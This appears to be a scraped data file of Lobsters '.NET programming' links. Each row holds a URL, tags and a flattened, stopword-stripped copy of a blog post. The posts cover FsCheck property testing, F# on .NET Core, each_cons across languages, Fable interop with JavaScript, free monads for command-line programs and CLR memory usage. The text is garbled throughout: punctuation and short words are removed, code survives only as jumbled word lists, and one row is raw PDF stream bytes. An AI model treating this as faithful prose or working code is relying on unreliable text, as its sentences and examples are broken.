x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer first element caused failure part input start keep going find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer find next test fails shrinking x parameter let x z arbshrink x seqtrypick fun x associativeproperty x z none else x z answer none point low go none shrink sequence caused failure finished x parameter repeat process parameter find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer find next test fails shrinking parameter let x z arbshrink seqtrypick fun associativeproperty x z none else x z answer none point low go none shrink sequence caused failure finished parameter finally repeat process z parameter find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer find next test fails shrinking z parameter let x z arbshrink z seqtrypick fun z associativeproperty x z none else x z answer none finished parameter final counterexample shrinking adding precondition say new idea property check create property called addition multiplication help stop malicious even accidental mixup implementation first attempt let additionisnotmultiplication x x x bt run test get failure checkquick additionisnotmultiplication falsifiable test shrink stdgen well duh obviously equal tell fscheck ignore input leave one alone done via filter expression prepended property function using operator defined fscheck example let additionisnotmultiplication x x x let precondition x x let additionisnotmultiplicationwithprecondition x precondition x additionisnotmultiplication x new property additionisnotmultiplicationwithprecondition passed checkquick like property checkquick additionisnotmultiplicationwithprecondition falsifiable test shrink stdgen oops forgot another case fix precondition let precondition x x x let additionisnotmultiplicationwithprecondition x precondition x additionisnotmultiplication x work checkquick additionisnotmultiplicationwithprecondition ok passed test kind precondition used want filter small number case input invalid filtering expensive case better way discussed future post fscheck documentation tweak property naming convention property property function different purpose function name haskell erlang world property given prop prefix convention net world common use suffix like abcproperty also f namespaces module attribute like test use organize property distinguish function combining multiple property set property combine group even gasp specification adding static member class type checkquickall pas name class example three addition property let add x x good implementation let commutativeproperty x add x add x let associativeproperty x z add x add z add add x z let leftidentityproperty x add x x let rightidentityproperty x add x x corresponding static class used checkquickall type additionspecification static member commutative x commutativeproperty x static member associative x z associativeproperty x z static member left identity x leftidentityproperty x static member right identity x rightidentityproperty x checkquickall additionspecification combining propertybased test examplebased test beginning post dismissive test used number test small part input space however think examplebased test role complement propertybased test examplebased test often easier understand le abstract provides good entry point documentation conjunction property example type additionspecification static member commutative x commutativeproperty x static member associative x z associativeproperty x z static member left identity x leftidentityproperty x static member right identity x rightidentityproperty x example well static member add static member add add static member add add using fscheck nunit use fscheck nunit test framework extra plugin eg fschecknunit nunit rather marking test test fact use property attribute unlike normal test test parameter example test open nunitframework open fscheck open fschecknunit property quietonsuccess true let commutative x commutativeproperty x property verbose true let associative x z associativeproperty x z property let left identity x leftidentityproperty x see change configuration test verbose endsize via property annotation quietonsuccess flag available make fscheck compatible standard test framework silent success show message something go wrong summary post introduced basic propertybased checking much cover though future post cover topic come property apply code property mathematical look general property inverse testing serializationdeserialization idempotence safe handling multiple update duplicate message also look test oracle create generator shrinkers seen fscheck generate random value nicely value constraint positive number valid email address phone number fscheck give tool build modelbased testing particular test concurrency issue also introduced notion evil malicious programmer might think malicious programmer unrealistic overthetop many case act like unintentionally malicious programmer happily create implementation work special case work generally evil intent unawareness blindness like fish unaware water often unaware assumption make propertybased testing force u become aware next time happy testing code sample used post available github want written follow post choosing property propertybased testing update talk propertybased testing based post slide video appendix installing troubleshooting fscheck easiest way make fscheck available create f project add nuget package install fscheck nunit package directory using fsx script file interactive development need load dlls appropriate package location like set current directory script directory systemiodirectorysetcurrentdirectory sourcedirectory assumes nuget install fschecknunit run assembly available current directory use older version r fscheckdll r nunitframeworkdll open system open fscheck open nunitframework next test fscheck working correctly running following let revrevisorig x list int listrev listrev x x checkquick revrevisorig get error everything good get error probably older version visual studio upgrade failing following first make sure latest f core installed currently make sure appconfig appropriate binding redirects make sure nunit assembly referenced locally rather gac step ensure compiled code work f interactive trickier using might run error systeminvalidcastexception unable cast object type arrow best cure upgrade failing use older version fscheck tested successfully comment please enable javascript view comment powered disqus blog comment powered
378,Lobsters,dotnet,"C#, F#, .NET programming",Tracking and Managing Processes on Windows,https://blog.rainway.io/tracking-and-managing-processes-on-windows-be9d95602b54,tracking managing process window,rainway blog,rainway blog update changelogs tutorial tip trick
379,Lobsters,dotnet,"C#, F#, .NET programming",Manual Memory Management for .NET,https://www.microsoft.com/en-us/research/wp-content/uploads/2017/07/snowflake-extended.pdf,manual memory management net,,obj length filter flatedecode stream b e uc dӎ r endstream endobj obj type page content r resource r mediabox parent r endobj obj colorspace r pattern r extgstate r font r r r r r r procset pdf text endobj obj length filter flatedecode stream u f h ν h jf l j iq b c
381,Lobsters,dotnet,"C#, F#, .NET programming",Getting started with F# and .NET Core,http://julienblanchard.com/2017/getting-started-with-fsharp-and-dotnet-core/,getting started f net core,tldr syme f software foundation core v mono v standard net framework mono net core net standard net native installation basic paket paket nuget fake fake ionide ionide omnisharp omnisharp forge forge web stuff nancy suave tamizh vendan f applied f language f syntax second use c libs c net core modern crossplatform development smooth operator note async parallel mailbox article rachel reese additional resource net core github repository slack f fun profit ebook awesome dotnet core repo expert f ody mbegbu video conclusion fsharpdata,getting started f net core jul tldr f net core really cool give try recently got interested net world thanks colleague c work last experience microsoft technology school year asp classic great one net core multiplatform opensource net functional language f f designed syme opensource maintained f software foundation individual contributor working microsoft really fond functional language like haskell ocaml took f testdrive see could benefit core v mono v standard bit terminology first net framework windowsonly usually think net mono crossplatform implementation net framework xamarin microsoft bought microsoft chose rewrite net truly crossplatform stripped apis considered core new product net core net core smaller crossplatform net framework net standard aim unify set apis net framework mono core must implement net native new initiative compile code native cpu instruction instead using clr compile intermediate language unfortunately resource using f net core still sparse example tailored net framework mono note learned far hope help installation first get net core follow installation instruction basic net core provides great command line tool dotnet creating new project λ mkdir project λ cd project λ dotnet new console lang f adding package λ dotnet add package newtonsoftjson restoring installing package λ dotnet restore building app λ dotnet build running app λ dotnet run publishing app λ dotnet publish publishing specific framework runtime λ dotnet publish framework runtime net core project used projectjson configuration file replaced xml file fsproj extension order gain better compatibility msbuild moving new format allows build restore multiple project simultaneously thanks solution file solution file useful want link project together using dotnet restore solution file level package solution restored instead every one adding project solution λ dotnet sln todosln add todoapptodoappfsproj additional tool use besides dotnet cli paket paket dependency manager net project work nuget package like dotnet add package also git repository reference http resource seems better solve dependency issue standard nuget way quite simple add core project download platorm paket init generate paketdependecies file paket install install dependency fake fake f make similar rake ruby world dsl use build deploy need example ionide ionide visual studio codeatom package f development everything find modern ide like syntax highlighting autocompletion type really awesome package using editor omnisharp emacs user like omnisharp crossplatform tool brings intellisense lot editor emacs vim combined fsharpmode make pretty nice development environment forge forge projectsolution management tool useful creating project without ide seems needed net core project working mono project nice addition toolbelt web stuff c would usually use aspnet core aka railsnet eventually nancy sinatralike framework web service need possible use f better alternative exists suave tamizh vendan written good book suave f applied f language f look lot like ocaml goody going detail syntax highlight feature language really like go check f syntax second quick overview syntax use c libs one best benefit using f amount quality net library available written c use f quite easily since first attempt learn net programming found learning bit c helpful understand use library stuff c net core modern crossplatform development book easy read simple enough approach learn ecosystem smooth operator pipe operator elixir borrowed f let pas result function left onto function first argument note f repl launched fsharpi needed end statement repl listfilter fun n n val int list take function left applies value right let double n n val double n int int printfn double double double val unit composition operator let compose function together let define two function triple square let triple n n val double n int int let square n n n val square n int int compose two function like let triplesquare triple square val triplesquare int int triplesquare val int operator take two function applies function right one left operator let isodd n n val isodd n int bool listfilter isodd val int list async parallel asynchronous workflow easily constructed using async also possible computation composed parallel using forkjoin combinator asyncparallel let async asyncsleep printfn finished return let async asyncsleep printfn finished return asyncparallel asyncrunsynchronously printfn output finished finished val async int val async int val unit example executes async task concurrently wait finish printing result mailbox another concurrency primitive available f mailbox f natively handle messagebased concurrency thanks mailbox processor somewhat brings erlang actor model f basically actor lightweight construct queue send message actor process incoming message sent queue great article rachel reese explores subject want dig deeper additional resource quite hard find good resource updated net core example setup github repository basic task needed like using database parsing json try update whenever manage something difficult find existing resource really friendly slack join f fun profit superb collection resource f ebook compiling post awesome dotnet core repo list libs tool resource development net core specifically f regarding book expert f great assumes prior net knowledge ody mbegbu made nice intro video getting started net core using f conclusion f nicely designed functional language oop try yet resource newbie friendly avoid word like functors monad general find geared toward practical usage pretty nice sometimes main issue net core moment still lot missing apis lead incompatible library like fsharpdata good news upcoming net core release later year bring something like apis libs compatible easily adaptable f great language robust ecosystem fp feature matter strong type system patternmatching good concurrency primitive interoperability c could gateway functional programming company currently rewriting slow ruby service wish demonstrate value coworkers hope article helped clearing bit work f net core hesitate post question remark
385,Lobsters,dotnet,"C#, F#, .NET programming",each_cons - the wise and tall of popular languages,http://realfiction.net/2017/05/22/each_cons-the-wise-and-tall-of-popular-languages/,eachcons wise tall popular language,eachcons wise tall popular language stranger ruby eachcons language f computational expression generate sequence c unary return operation kotlin type safety v elegance idris idris anton trunov answered question n n n vect list vect n z zero successor vect integer previous next comment,eachcons wise tall popular languagesa day ago michael feather tweeted complete stranger ruby statement resonated upon requesting example michael came arr eachcons count x x eachcons function provides consecutive element given list eg eachcons x z put x z useful obtaining info local structure list think derivative rate change etc probably host thingsthis indeed show ruby expresiveness quite nicely simple syntax concatenate listsa rich set library manipulation thing referring eachcons syntax ruby yield block used many time syntactical basis dslsthe fact parameter influence many item yielded block reminds u u like write javascript whilewhat language f let look code performs almost job seq yield yield seqpairwise seqfilter fun x x seqlengthit pretty compact readable even though thing look similar actually use completely different mechanic languagethe first line computational expression generate sequence provides u pretty syntax concatenating element list elementsthe pairwise closest get eachconsthe length version provide filter condition need specify filter beforehandthe pairwise method provides tuple pattern matched two argument lambda filterof note pairwise provide exactly consecutive element list allow parameter like ruby version make sense since f statically typed wanted version provides consecutive element would write method yield element type c actually achieve level expressiveness need put work two additional extension method concat arr windowed count tx ty tuples available c deconstruct like functional language even actually gone great length make deconstruction dependable feature kind forgive missing eachconslike bcl method write toenumerable almost every project mean method damned unary return operation kotlinxavier lepaul chimed view kotlin respect challenge listof arr windowed count x x nt fall short ruby example however windowed available yet kotlin particularly liked even though type signature windowed isfun iterable windowed size int step int list list ie returning list list one still deconstruct list x see lambda provided count work deconstruction kotlin simply start working deconstructed object provides method named componentn quick look kotlin list type kudos kotlin team make language feel functional strategy different real functional language outsider jvm time get know java kotlin really fathom exactly would make stick javatype safety v elegance order ruby kotlin shine example pay allowing misunderstanding api use surface runtime note language compiler happily allow capture le output eachconswindowed actually provides seems price need pay api since output type determined argument windowing function language type could determined programmatically idrisidris programming language close spirit haskell add capability define dependent type disclaimer never worked idris vague idea dependent type could looking moment thing idris continue outside grasp many many thanks go anton trunov answered stackoverflow questionsin language define following type signature method window n nat list list vect n describes method take natural number n list containing thing type return list containing vector length n n become part type definition vect much help could nt see make leap variable length list type vect n one possible implementation windowed idris total takeexact n nat x list maybe vect n takeexact z x takeexact n nothing takeexact n x x takeexact n x takeexact n x x nothing nothing takeexact n x x v x v total window n nat list list vect n window n x takeexact n x window n x nothing window n y window n x x y y window n xstotal tell idris compiler check method whether indeed total far idris capable tell total mean method guaranteed return whatever input provided z type representing zero successor within natural number typenow use window function write example provided condition vect integer bool condition x x hello length filter condition window natit also pretty compact little difference filter function provided must deconstruct vector type vect integer based argument window function function forced take vector whole deconstruct exactly right size providedwhy interesting sometimes plain fun compare different programming language present different way thinking different way express intention one common theme conciseness come get close functional programming idiom also post nt think could actually expand upon haskell type system ala also recognize great popularity language like ruby reasoning type requires much practice help squash bug even get runtime language like javascript ruby reward quickly get act together depend decent documentation get api usage righthence ruby indeed expressive quite popular language learned recreate expressiveness possibility respective runtimes provideprevious nextcomments
386,Lobsters,dotnet,"C#, F#, .NET programming",F# Interop with Javascript in Fable: The Complete Guide,https://medium.com/@zaid.naom/f-interop-with-javascript-in-fable-the-complete-guide-ccc5b896a59f,f interop javascript fable complete guide,f interop javascript fable complete guide enviroment setup dotnet cli node v code ionide working code http defining undefined example example parameterized emit function example example example typesafe javascript function option writing jquery binding glue doc instancebased method chaining jquery binding working object literal string literal type better using attribute alfonso garciacaro using list discriminated union object literal creating object literal inline interacting existing javascript code interacting javascript npm package working overload doc curried uncurried function conclusion,f interop javascript fable complete guidefable f javascript compiler always motto compiler emits javascript proud true generated javascript code readable idiomatic sometimes believe saying javascript even beautiful however fable another killer feature subject article simple interop javascript ecosysteminterop javascript mean would write f code call native javascript function general sense let generate custom javascript code control also let interact use javascript code library codein article present plethora example use javascript interop covering lot grab cup coffee let get startedenviroment setupskip section already know setup minimal fable appwe use local developement enviroment get started need latest dotnet cli node npm installed machine npm packaged node need seperate downloadlets create directory project mkdir fableinteropcd fableinteropif working fable first time need run dotnet new fabletemplate download latest fable template project nuget cache machinenow inside fableinterop directory run dotnet new fable generate minimal fable app template editor using v code ionide crossplatform f developementafter project need install dependency could take couple minute least machine npm installdotnet restorewhen finish tooltips autocompletion working inside v codeworking fable bit tricky need thing working simultaneously editsaverecompile flow usually use shell tab one running fable compilation server using dotnet fable start fable work behind local server cache compilation state recompiles project change file making subsequent compilation fast second tab running webpack developement server using npm run start actually watch change project sends fable server webpack also responsible serving static content bundling code refreshing browser recompilation succesfulworking codeinside srcappfs delete everything leave keep fablecore fablecorejsinterop open provide function attribute interop fableimportbroweser opened using consolelog generally recommended fully qualify browser module want use function ie browserconsolelog using like brevityfor use srcappfs start developement mode run command dotnet fable npmrun startthis start two process one fable compilation server one webpack developement server work together make change code fast recompilations alternatively run server seperately run dotnet fable start shell tab another tab run npm run start navigate http open browser console see edit save appfs file come back browser console see changesthe emit attributethis attribute attach value function member language construct override default code generation next many usecases attributedefining undefinedjavascript literal value known undefined f construct use emit attribute generate value following example notice part emit undefined obj jsnative string undefined emit called emit expression get injected place undefined value code compiled obj type give value case obj correct undefined could object javascript right hand side assignment ignored compilation due fact emit attribute attribute omitted jsnative throw errorthis way define custom value type use regularly fsharp code inforce concept another example whenever compiler come across value one inject literal value within emit case another thing notice fact type int turn allows use operator type checker think integer correct type caseyou careful always write correct type otherwise code fail runtime cause unexpected behaviorgenerating literal code like example us useful real fun start parameterize emit expression using emit function giving macrolike behavior parameterized emit functionsto extend first example want write function check whether value undefined example take closer look function isundefined one paramter called x generic type function return bool notice emit expression placeholder whatever value pas function place parameter x number parameter therefore first parameter case x index multiple parameter also allowed example another useful example want check whether value number nan using native isnan function might want call function without paramters get result example want random number using native mathrandom actually systemrandom supported fable use showing dotypesafe javascript function option type option special usage fable namely erased compiled x becomes x none becomes null use give native function typesafety example function parsefloat type string float parsefloat might fail parsing input string return nan know nan valid value float sake better semantics want use type string option float return none return value nan wrap native function inside typed one use pattern matching emit expression parsefloatfollows logic parsefloat could return nan therefore check result parsing nan return null case otherwise return parsed value giving function return type float option make convenient work function way ensure code account failure parsing make sure handle case none toohowever approach still robust parsing succeeds input return instead failing like limitation native function correctly parse number use little javascript trick putting operator string parse string number work hear say know guess good mine good reason hope notice used twice emit expression passed parameter twice well efficient parameter result expensive operation wrapped inside lambda proper scoping used still use parse function bcl try parse systemdouble try parse etc implemented mimic actual behavior net much possiblewriting jquery binding gluewe use learnt far write jquery binding binding collection function call function original api case native library jqueryfirst add reference jquery publicindexhtml file script tag include bundlejs file indexhtml look something like notice page load jquery available globally called page another place reference dollar sign directly window object like window window use emit write binding let assume want make binding functionalish go follows define jquery instance type empty type tell function return jquery element something else making type interface ensure type generate extra code type checker define jquery module first think want use binding want able use functional style way use seq async list etc want generate something like following chaining const div window main divcss backgroundcolor red click function ev consolelog clicked addclass fancyclass notice use jqueryselect alias need refence dollar sign use like emit dollar sign reserved emit expression however inside browser every globally available variable property window object get reference window like notice putting quote becomes allowed emit expressionthe method defined similar way like seen forth rest function want support jquery notice order enable chaining passing el last parameter type ijquery returning ijquery jquery function return jquery object see doc make nice functional api although personal preferenceinstancebased method chaining jquery bindingwriting jquery binding module one one way enable chaining jquery method bet expected usual way chaining method dot api requires method placed instance type rather module earlier used interface ijquery empty time fill interface abstract method observation using abstract method define type signaturesabstract method without emit attribute compiled using name methodfor customnamed function onclick using emit fall back actual name click instance first parameter using instance argumentthe cs paramter tuple correctly compile javascript used parameter cs string string ijquery would able dot code would use cs paramters parenthesesi kept using jqueryselect start chain used like produce like giving everything type go quickanddirty dynamic programming capability fable although personally discourage using model one main reason chosing f compile javascript powerful typesystem wanted write dynamic code bother use fable first place anyways might like model working object literalsjquery among almost every javascript library work object literal used paramters time ubiquitoususing fable want able create manipulate object literal typesafe way multipe way example assume imaginary function javascript addtime natively used like see object literal consists three property current type date javascript amount type number unit string represent type f would use datetime current int amount string unit use type represent whole object literal like following let call addtimeprops output simple object literal becomes output exactly external function addtime expecting notice addtimeprops constructor used createempty function special fable function create empty object literal given type paramter case addtimeprops also notice using emit property abstract fable use name property provided use custom name use emit attribute funny emit expression syntax like replacing property amount specialamount using emit produce property custom name using optional parameter syntax determine whether use setter getter propertystring literal type betternow might satisfied solution typesafety actually better suppose reading doc addtime come across information property unit string value day month year ensure one forgets value write incorrectly want compiler check correctness code case use stringenum attribute similar stringtyping typescript define discriminated union case paramters compiled string compiletime example use enhance addtimeprop type even typesafety changing type unit string timeunit case discriminated union camelcased compiled need custom name union case year instead year use compiledname attribute applied case output becomes using pojo attributeplain old javascript object pojos another name object literal fable provides useful attribute pojo applicable record type make compile object literal example change fact still immutable however still start empty object using createempty function note fable author alfonso garciacaro pojo record intended typesafe interaction javascript library require plain object like react component record lack many feature like instance static method reflection supportusing list discriminated union object literalyes also possible use previous example person would describe discriminated union person property name age sum type either name age person make sense order work actually need list person quite idiomatic f work well look nice interacting external library list person use special function keyvaluelist provided fable fablecorejsinterop turn list object literal type object literal used many optional property object want couple ignore rest work pretty well example react style object jquery ajax optionsyou also use adhoc property using unbox using new dynamic operator worth noting fable try convert list object literal compiletime value constant runtime value yet determined runtimecreating object literal inlineagain feel lazy want give everything type another fable function called createobj fablecore function creates object literal like createobj nice becuase accepts list keyvalue pair like would expect object literal easily nest object interacting existing javascript codeall interaction javascript far generating custom code injected compilation using different attribute function fable provides time interact existing javascript code actually call f learn write javascript hand first create file called customjs like file contain two function call f parsejson getvalue organized using module compatible webpack parsejson try parse string object literal return null fails getvalue try get value object literal using string index return null property exist ie property undefined function return either result null qualifies return option also notice file directory src appfs file importing custom code use relative pathsto import function use import function inside appfs like first argument import value want import case function parsejson second argument want import value case file called customjs directorynow function available used output another way import function number function javascript module using importall function first put declaration one type import function javascript module type javascript module export single value created file defaultjs inside src directory code import using importdefault interacting javascript npm packagesmodern javascript library distributed npm node package manager module le often built ready library add page script tag fable apps definitely want interact library following example want use silly library called leftpad call silly library single function used million instead know writing function whenever need itanyways stop ranting go customjs file instead pointing path library point name first want install library using npm running npm install save leftpad package added dependency packagejson file see entry leftpad dependency insalled nodemodules directory magic webpack import anywhere f code like working overloadsif look doc leftpad function leftpad another overload two parameter overload normal f function like one write function different meaningful name two parameter want overload method name use static method classwhat function one paramter parameter string int datetime use erased union special union type created overloading paramter type define function parameter type would use etc use function write notice funny operator specially made work erased type check whether provided type actually compatible parameter typecurried uncurried functionsfunctions f curried default using multiple argument function becomes single parameter function return function example function equivalent curried function early day fable used compile curried function closure recently fable beta compilation optimized function uncurried wanted explicitly return function like would use systemfunc signature return type conclusionthere many way interact javascript fable allows leverage javascript ecosystem numerous library published npm hope learnt lot article forget hit heart icon share
387,Lobsters,dotnet,"C#, F#, .NET programming","Hello, pure command-line interaction",http://blog.ploeh.dk/2017/07/11/hello-pure-command-line-interaction/,hello pure commandline interaction,welldescribed explained earlier reject notion dependency still large group application work command line api read realistic example already instruction set scott wlaschin excellent explanation ast design abstract syntax tree haskell pure interpretation syntactic sugar computation expression source functor free monad recipe follow functor recipe api computation expression producing asts pretty code summary next pure commandline wizard,gentle introduction modelling impure interaction pure code dependency injection welldescribed concept objectoriented programming explained earlier functional make everything impure general reject notion dependency instead designing application concept impurepureimpure sandwich possible often think still large group application work application need interact impure world extended time need way model interaction pure way article introduces way command line api imagine write commandline program ask series question print appropriate response general case potentially longrunning series interaction user program keep simple though article start looking degenerate example please enter name mark hello mark program simply going request enter name done print greeting objectoriented programming using dependency injection might introduce interface keeping simple restrict interface two method public interface icommandline string readline void writeline string text please note clearly toy example later article see expand example cover complex interaction could also read realistic example already initially example degenerate single interaction case impurepureimpure sandwich still possible design would nt scale complex interaction problem defining injecting interface nt functional functional equivalent instruction set instead defining interface define discriminated union describes limited instruction set commandline interaction type commandlineinstruction readline string writeline string may notice look bit like c interface instead defining two method defines two case name similar readline case instruction interpreter evaluate data contained case continuation function evaluating instruction interpreter must invoke function string interpreter figure string use could example come reading input string command line continuation function next step whatever program writing writeline case another instruction interpreter data contained case tuple first element tuple input interpreter choose eg print value command line ignore second element tuple value used continue whatever program case part enables write small specialised abstract syntax tree ast currently way return one way add third stop case interested option scott wlaschin cover one iteration excellent explanation ast design instead adding third stop case commandlineinstruction another option add new wrapper type around type commandlineprogram free commandlineinstruction commandlineprogram pure free case contains commandlineinstruction always continues new commandlineprogram value way escape ast via pure case simply contains return value abstract syntax tree two type write specialised program contain instruction interpreter notice type pure intent although f ca nt really tell however repeat exercise haskell instruction set look like data commandlineinstruction next readline string next writeline string next deriving functor type commandlineprogram free commandlineinstruction type pure io nowhere sight haskell function pure default also applies string next function contained readline case back f land write ast implement commandline interaction shown beginning article commandlineprogram unit let program free writeline please enter name free readline fun free writeline sprintf hello pure ast defines little program first step writeline instruction input value please enter name writeline case constructor take tuple input argument first tuple element prompt second element continuation new commandlineinstruction commandlineprogram value example continuation value readline case take continuation function input function return new program value returning writeline second writeline value creates string outer value second tuple element writeline case must new program value program done use stop value pure probably think quit mushroom one right mind want write code like neither would fortunately make coding experience much better see later interpretation program value small commandlineprogram unit pure value nt anything clearly like something order make happen write interpreter commandlineprogram let rec interpret function pure x x free readline next consolereadline next interpret free writeline next consolewriteline next interpret interpreter recursive function patternmatches case commandlineprogram encounter pure case simply return contained value encounter readline value call consolereadline return string value read command line pipe input value next continuation function produce new commandlineinstruction commandlineprogram value finally pipe continuation value recursively similar treatment given writeline case consolewriteline writes command line next recursively piped interpret run interpret program get interaction like please enter name ploeh hello ploeh program pure interpret function impure syntactic sugar clearly nt want write program asts like fortunately nt add syntactic sugar form computation expression way turn ast type monad haskell already done free monad f code required source functor first step define map function underlying instruction set union type conceptually define map function type created functor obeys functor law functors common often pay aware b commandlineinstruction commandlineinstruction b let private mapi f function readline next readline next f writeline x next writeline x next f mapi function take commandlineinstruction value map new value mapping underlying value decided make function private later also going define map function commandlineprogram nt want confuse user api two different map function also reason name function nt simply map rather mapi stand instruction mapi patternmatches implicit input argument readline case return new readline value us mapper function f translate next function recall next function type string compose f function type b get string b string b transformed b readline case writeline case functor fortunately writeline case similar although small tweak required case contains tuple data first element x nt generic type string nothing map use asis new writeline value return writeline case degenerate next nt function rather value type f function type b piping next f return b functor order keep category theorist happy point functors really subtype functors called endofunctors additionally functors must obey simple intuitive law order functors say free monad reason spend much time talking functors goal syntactic sugar get computation expression order create computation expression builder need monad need recipe creating monad fortunately type monad called free monad virtue enables create monad functor need haskell happens automatically declare type commandlineprogram free commandlineinstruction thanks haskell type system free automatically monad underlying type functor f work monad fact haskell automate mean recipe follow earlier article mentioned passing alternative way define stop case instruction set reason chose separate api two type instruction set program instruction set underlying functor program part free monad part bind function obeys monad law commandlineprogram b commandlineprogram commandlineprogram b let rec bind f function free instruction instruction mapi bind f free pure x f x recursive function patternmatches implicit commandlineprogram argument pure case return value x type fit input f function result value type commandlineprogram b free case instruction functor map function mapi first argument mapi function must function type b compose function partially apply recursive bind function f bind f get function type commandlineprogram commandlineprogram b fit mapi instruction type commandlineinstruction commandlineprogram refer back definition free case need convince result calling mapi instruction commandlineinstruction commandlineprogram b value order turn commandlineprogram b value wrap new free case although required bit explanation defining bind function free monad repeatable process haskell automated f explicitly write code follows recipe get hang much functor occasionally need explicitly use bind function often disappear computation expression building block api bind function though may example need map function b commandlineprogram commandlineprogram b let map f bind f pure make commandlineprogram functor well reason made mapi private mapi make instruction set functor api expressed term ast program consistent within module map work data type bind notice map defined composition bind pure part recipe free monad map function always look like f function function type b pure case constructor type b commandlineprogram b notice used b generic type argument instead usual hopefully make clear compose two function together f pure get function type b b commandlineprogram b commandlineprogram b type function needed bind function whole composition turn typecheck work intended api order work api need ability create value api type case must able create commandlineprogram value create explicitly using readline writeline free pure case constructor convenient predefined function value commandlineprogram string let readline free readline pure string commandlineprogram unit let writeline free writeline pure readline case input instruction define readline predefined commandlineprogram string value writeline case hand take input argument string write define writeline function return commandlineprogram unit value computation expression addition map supporting api honest bit digression going use function later nt required order create computation expression builder need bind function way lift raw value monad place builder matter delegation type commandlinebuilder member thisbind x f commandlinebind f x member thisreturn x pure x member thisreturnfrom x x member thiszero pure fairly minimal builder experience time need create instance commandlinebuilder class write computation expression let commandline commandlinebuilder usually put object module autoopen attribute available global object producing asts pretty code using commandline computation expression like using builtin async seq expression use rewrite ast readable code commandlineprogram unit let program commandline commandlinewriteline please enter name let name commandlinereadline sprintf hello name commandlinewriteline produce ast much readable syntax ast use interpret function run interaction please enter name free hello free obviously toy example coming article see gradually enhance code perform complex interaction summary functional programming emphasis pure function separation pure impure code simplest way achieve separation design code impurepureimpure sandwich sometimes nt possible possible alternative define instruction set ast turn free monad order enable enough syntactic sugar keep code readable may seem complicated benefit making impurity explicit code whenever see commandlineprogram value know runtime something impure likely happen uncontrolled impurity though inside commandlineprogram reading writing command line happen going generate random value change global variable send email unpredictable operation unless interpreter next pure commandline wizard
388,Lobsters,dotnet,"C#, F#, .NET programming",Memory Usage Inside the CLR,http://www.mattwarren.org/2017/07/10/Memory-Usage-Inside-the-CLR/,memory usage inside clr,memory usage inside clr note dotmemory jetbrains ant memory profiler redgate highlevel view vmmap sysinternals suite note sasha goldshtein private byte virtual byte working set image memory info memory type coreclr managed heap created garbage collector microsoft doc internal clr heap memory perfview tool virtualalloc rtlallocateheap notable memory allocation gccpp byte k back basic mark sweep garbage collection byte k marking card table byte k byte k byte k byte k hndcreatehandletable byte k stresslog initialize comment info byte k eestartuphelper routine byte k virtualcallstubmanager initstatic creates dispatchcache virtual stub dispatch botr byte debuggerheap init debuggerrcthread init initializedebugger execution engine heap frequently accessed rarely accessed loaderallocatorhpp drill net framework internals see clr creates runtime object loaderheaps highfrequencyheap lowfrequencyheap stubheap key data structure section eeclass methodtable methodtable eeclass methodtable eeclass link actual code configured code virtual stub dispatch code specified commitreserve size take look loaderheapcpp jit memory usage transient permanent transient memory jit data structure compiler fgvaluenumber compilerhpp srcjitalloccpp lot place throughout clr clr host permanent memory compiler compgetmem compiler compcompile srcjitalloccpp realworld example question reduce memory consumption coreclr hackernews reading,memory usage inside clr jul word ever wondered net runtime clr allocates memory mean managed memory code allocates eg via new myclass garbage collector gc clean mean memory clr allocates internal data structure need make possible code run note clarify post telling analyse memory usage code recommend using one excellent net profilers available dotmemory jetbrains ant memory profiler redgate personally used great highlevel view fortunately fantastic tool make easy u get overview memory usage within clr called vmmap part excellent sysinternals suite post using simple helloworld program observe clr simplest possible scenario obviously thing may look bit different complex app firstly let look data time second interval helloworld program print console wait press enter memory usage reached peak remains till program exit click larger version however get detailed view look snapshot second timeline memory usage stabilised note want find memory usage general also specifically measure net application recommend reading excellent series post sasha goldshtein also like always get different type memory mixedup please read stackoverflow answer first private byte virtual byte working set image memory seen highlevel view let take close look individual chuck largest labelled image according vmmap help page see info memory type represents executable file exe dll loaded process image loader include image mapped data file would included mapped file memory type image mapping include shareable memory like code data region like initialized data modified additional private memory created process point worth pointing thing memory take large amount total process memory using simple helloworld program type program dominate memory usage much using debug version coreclr clr specific file systemprivatecorelibdll coreclrdll clrjitdll corerunexe may well larger compiled release mode memory potentially shared process compare number total w private w shareable w shared w column see action managed heap created garbage collector next largest usage memory gc preallocates several heap give whenever program allocates object example via code new myclass new byte main thing note image clearly see different heap mb allocated generation gen mb large object heap addition note difference amount size committed column committed memory actually used total size gc preallocates reserve front address space interested rule heap specifically segment size helpfully explained microsoft doc simply put varies depending gc mode workstation v server whether process number cpu internal clr heap memory however part going look rest post memory allocated clr unmanaged memory us internal data structure look vmmap ui view really tell u much however using excellent perfview tool capture full callstack memory allocation call virtualalloc rtlallocateheap obviously function apply running coreclr window perfview give u following data yes pretty powerful let explore data detail notable memory allocation place clr allocates significant chunk memory upfront us lifetime listed gc related allocation see gccpp mark list byte k wks makemarklist using mark phase gc see back basic mark sweep garbage collection card table byte k wks gcheap makecardtable see marking card table overall heap creationallocation byte k wks gcheap makegcheap soh segment creation byte k wks gcheap allocate triggered first object allocation loh segment creation byte k wks gcheap allocatelargeobject triggered first large object allocation handle table byte k hndcreatehandletable stress log byte k stresslog initialize stress log activated see comment info watson error reporting byte k eestartuphelper routine virtual call stub manager byte k virtualcallstubmanager initstatic turn creates dispatchcache see virtual stub dispatch botr info debugger heap controlblock byte debugging support needed debuggerheap init debuggerrcthread init called via initializedebugger execution engine heap however another technique us allocated heap often time perform individual allocation within heap needed heap split individual usecases common frequently accessed data counterpart data rarely accessed see explanation comment loaderallocatorhpp done ensure clr retains control memory allocation therefore prevent fragmentation heap together known loader heap explained drill net framework internals see clr creates runtime object wayback machine version loaderheaps loaderheaps meant loading various runtime clr artifact optimization artifact live lifetime domain heap grow predictable chunk minimize fragmentation loaderheaps different garbage collector gc heap multiple heap case symmetric multiprocessor smp gc heap host object instance loaderheaps hold together type system frequently accessed artifact like methodtables methoddescs fielddescs interface map get allocated highfrequencyheap le frequently accessed data structure 